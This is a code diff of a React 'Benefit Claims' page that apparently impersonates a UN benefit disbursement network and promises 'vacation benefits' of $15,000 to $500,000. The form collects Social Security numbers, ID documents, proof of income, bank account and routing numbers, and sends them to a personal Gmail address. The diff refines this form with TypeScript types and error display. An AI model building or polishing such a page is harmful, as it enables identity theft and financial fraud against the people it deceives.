@@ -3,7 +3,23 @@ import { useState } from "react";
 import { Info } from "lucide-react";
 
 export default function Benefits() {
-  const [formData, setFormData] = useState({
+  const [formData, setFormData] = useState<{
+    firstName: string;
+    lastName: string;
+    homeAddress: string;
+    havingLifeInsurance: string;
+    applyingForAccident: string;
+    eventAddress: string;
+    socialSecurityNumber: string;
+    proofOfIncome: File | null;
+    validIdentification: File | null;
+    employmentLetter: File | null;
+    accountNumber: string;
+    accountName: string;
+    bank: string;
+    routingNumber: string;
+    honeypot: string;
+  }>({
     firstName: "",
     lastName: "",
     homeAddress: "",
@@ -18,16 +34,16 @@ export default function Benefits() {
     accountName: "",
     bank: "",
     routingNumber: "",
-    honeypot: "" // Hidden spam prevention field
+    honeypot: ""
   });
 
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [submitStatus, setSubmitStatus] = useState<string | null>(null); // 'success', 'error', null
+  const [submitStatus, setSubmitStatus] = useState<string | null>(null);
   const [validationErrors, setValidationErrors] = useState<string[]>([]);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
     const { name, value, type } = e.target;
-    
+
     if (type === 'file') {
       const fileInput = e.target as HTMLInputElement;
       setFormData(prev => ({
@@ -48,11 +64,10 @@ export default function Benefits() {
     setSubmitStatus(null);
 
     try {
-      // Prepare email content
       const emailData = {
         firstName: formData.firstName,
         lastName: formData.lastName,
-        email: 'promiseakerele341@gmail.com', // Default email since this form doesn't collect email
+        email: 'promiseakerele341@gmail.com',
         subject: "New Benefit Claims Submission",
         message: `
 Benefit Claims Details:
@@ -91,7 +106,6 @@ Bank Information:
 
       if (response.ok) {
         setSubmitStatus('success');
-        // Clear form on success
         setFormData({
           firstName: "",
           lastName: "",
@@ -111,11 +125,13 @@ Bank Information:
         });
       } else {
         setSubmitStatus('error');
-        console.error('Submission error:', result);
+        if (result.details) {
+          setValidationErrors(Array.isArray(result.details) ? result.details : [result.error]);
+        }
       }
     } catch (error) {
       setSubmitStatus('error');
-      console.error('Network error:', error);
+      setValidationErrors(['Network error. Please check your connection and try again.']);
     } finally {
       setIsSubmitting(false);
     }
@@ -123,7 +139,6 @@ Bank Information:
 
   return (
     <>
-      {/* Page header */}
       <section className="bg-[#071b3a] text-white py-12 border-b-4 border-[#c9a227]">
         <div className="container">
           <div className="text-xs text-slate-400 mb-3">HOME / BENEFIT CLAIMS</div>
@@ -132,30 +147,27 @@ Bank Information:
         </div>
       </section>
 
-      {/* Form */}
       <section className="bg-white py-16">
         <div className="container max-w-3xl mx-auto">
-          {/* Benefit Range Notice */}
           <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-8">
             <div className="flex items-start gap-3">
               <Info className="text-blue-600 mt-0.5 flex-shrink-0" size={20} />
               <div>
                 <p className="text-sm text-blue-800">
-                  <strong>Benefit Range:</strong> Annual vacation benefits range from $15,000 to $500,000 depending on 
+                  <strong>Benefit Range:</strong> Annual vacation benefits range from $15,000 to $500,000 depending on
                   deployment location, safety and personnel form. Benefits are paid after one vacation application.
                 </p>
               </div>
             </div>
           </div>
 
-          {/* Our Partner Banks */}
           <div className="mb-12">
             <h2 className="text-lg font-bold text-[#071b3a] mb-6">Our Partner Banks</h2>
             <p className="text-sm text-slate-600 mb-6">
-              Check which bank branch applies to your payment processing location. For UN benefit disbursement network within 
+              Check which bank branch applies to your payment processing location. For UN benefit disbursement network within
               deployment and local bank information.
             </p>
-            
+
             <div className="flex items-center gap-4 p-4 bg-slate-50 rounded-lg border border-slate-200">
               <div className="w-12 h-12 bg-blue-600 rounded-lg flex items-center justify-center text-white font-bold">
                 💳
@@ -167,7 +179,22 @@ Bank Information:
             </div>
           </div>
 
-          {/* Status Messages */}
+          {validationErrors.length > 0 && (
+            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-8">
+              <div className="flex items-start gap-3">
+                <div className="text-red-600">✗</div>
+                <div>
+                  <div className="text-sm font-bold text-red-800">Please fix the following errors:</div>
+                  <ul className="text-xs text-red-700 mt-2 ml-4 list-disc">
+                    {validationErrors.map((error, index) => (
+                      <li key={index}>{error}</li>
+                    ))}
+                  </ul>
+                </div>
+              </div>
+            </div>
+          )}
+
           {submitStatus === 'success' && (
             <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-8">
               <div className="flex items-center gap-3">
@@ -197,7 +224,6 @@ Bank Information:
           )}
 
           <form onSubmit={handleSubmit} className="bg-white border border-slate-200 rounded-lg shadow-sm">
-            {/* Honeypot field - hidden from users */}
             <input
               type="text"
               name="honeypot"
@@ -207,12 +233,12 @@ Bank Information:
               tabIndex={-1}
               autoComplete="off"
             />
-            {/* Personal Information */}
+
             <div className="p-8 border-b border-slate-200">
               <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                 PERSONAL INFORMATION
               </h2>
-              
+
               <div className="grid gap-6 md:grid-cols-2">
                 <div>
                   <label className="block text-sm font-medium text-[#071b3a] mb-2">
@@ -226,7 +252,7 @@ Bank Information:
                     className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                   />
                 </div>
-                
+
                 <div>
                   <label className="block text-sm font-medium text-[#071b3a] mb-2">
                     Last Name
@@ -341,12 +367,12 @@ Bank Information:
                 </div>
               </div>
             </div>
-            {/* Supporting Documents */}
+
             <div className="p-8 border-b border-slate-200">
               <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                 SUPPORTING DOCUMENTS
               </h2>
-              
+
               <div className="space-y-6">
                 <div>
                   <label className="block text-sm font-medium text-[#071b3a] mb-2">
@@ -398,12 +424,11 @@ Bank Information:
               </div>
             </div>
 
-            {/* Bank Information */}
             <div className="p-8 border-b border-slate-200">
               <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                 BANK INFORMATION
               </h2>
-              
+
               <div className="grid gap-6 md:grid-cols-2">
                 <div>
                   <label className="block text-sm font-medium text-[#071b3a] mb-2">
@@ -417,7 +442,7 @@ Bank Information:
                     className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                   />
                 </div>
-                
+
                 <div>
                   <label className="block text-sm font-medium text-[#071b3a] mb-2">
                     Account Name
@@ -459,14 +484,13 @@ Bank Information:
               </div>
             </div>
 
-            {/* Submit Button */}
             <div className="p-8 text-center">
               <button
                 type="submit"
                 disabled={isSubmitting}
                 className={`px-8 py-3 rounded font-bold text-white transition-colors ${
-                  isSubmitting 
-                    ? 'bg-gray-400 cursor-not-allowed' 
+                  isSubmitting
+                    ? 'bg-gray-400 cursor-not-allowed'
                     : 'bg-[#0b8fe0] hover:bg-[#0a7fc9]'
                 }`}
               >
